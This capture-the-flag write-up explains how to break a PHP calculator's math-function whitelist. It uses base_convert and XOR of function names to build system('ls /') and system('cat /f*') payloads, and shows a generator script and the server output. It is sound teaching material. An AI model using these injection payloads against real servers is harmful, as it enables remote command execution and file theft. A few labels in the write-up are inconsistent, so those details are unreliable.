## Calc.exe Online
> **Category:** Web
> **Description:** 
> **Pad Link:** http://34.87.94.220/pad/web-calcexe-online
> **Flag:** flag{d0_y0u_kn0w_th1s_15_a_rea1_w0rld_cha11enge}
---

## References
* https://www.anquanke.com/post/id/220813
* https://www.php.net/manual/en/function.base-convert.php
* https://www.php.net/manual/en/function.dechex.php

## Exploit Ideas
We can use Base-36 to insert arbitrary alphanumeric characters, allowing us to bypass the whitelisting by using `base_convert()` PHP [function](https://www.php.net/manual/en/function.base-convert.php).

```
# Example
base_convert(1751504350,10,36) -> system
base_convert(784,10,36)        -> ls
```

However, in order to insert symbols, we need to make further use of the whitelisted math functions. Let's include the use of primitive operations such as XOR (`^`).

> Note that operations are done using `string` datatype.

The idea is, we will pass in a XOR'd decimal value to be XOR'd again on the server end using the whitelisted math functions.

```
"a"^"a"     -> 0
"a"^"x"^"a" -> "x"

# Extending the logic to use those math functions instead, where $i and $k are the whitelisted functions:
$k^$i^"x"^$i^$k -> "x"
```

The following script generates a list of combined functions along with the string `" /"`:

```php
<?php
	$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
	$whitelist2 = [ 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh','abs'];

	foreach ($whitelist as $i):
		foreach ($whitelist2 as $k):
		echo $k^$i^" /";
		echo "   " . $i . " " . $k;
		echo "<br/>";
		endforeach;
	endforeach;
?>
```

Producing the output to produce the string `" /"`:
```
...
25 sin asin
25 sin asinh
22 sin atan2
22 sin atan
22 sin atanh
...
```

Remember that the challenge restricts us to use the whitelisted functions only, so we can use the `dechex()` [function](https://www.php.net/manual/en/function.dechex.php). This means that the first column in the output must be representable in hexadecimal form.

Finally, we can combine what we have so far to run the command `system(cat /)`:
```
base_convert(1751504350,10,36)  -> system
base_convert(784,10,36)         -> ls
dechex(34)^sin^atanh            -> " /"

# Into:
base_convert(1751504350,10,36)(base_convert(784,10,36).(dechex(34)^sin^atanh))
```

This results in the server's response to be:
```
bin boot dev etc flag_a2647e5eb8e9e767fe298aa012a49b50 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var var
```

Thus the flag file is revealed to be in the root directory.

Now, we have to change the command to `cat` instead. Also, we need to target the flag file. Let's do the process to get the `"f*"` string, which we can concatenate into `" /f*"`.

> A caveat is that we can only specify 2 characters at a time (so we need to combine the payloads)



```
base_convert(1751504350,10,36) 	-> system
base_convert(784,10,36) 		-> cat
dechex(34)^sin^atanh			-> " /"
dechex(242)^sinh^sqrt			-> "f*"

# Into:
base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(34)^sin^atanh).(dechex(242)^sinh^sqrt))
```

Which gives us the flag: `flag{d0_y0u_kn0w_th1s_15_a_rea1_w0rld_cha11enge}`

## Scripts

Used for generating a list of white-listed functions XOR'd with the string to generate:
```php
<?php
	$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
	$whitelist2 = [ 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh','abs'];

	foreach ($whitelist as $i):
		foreach ($whitelist2 as $k):
		echo $k^$i^" /";
		echo "   " . $i . " " . $k;
		echo "<br/>";
		endforeach;
	endforeach;
?>
```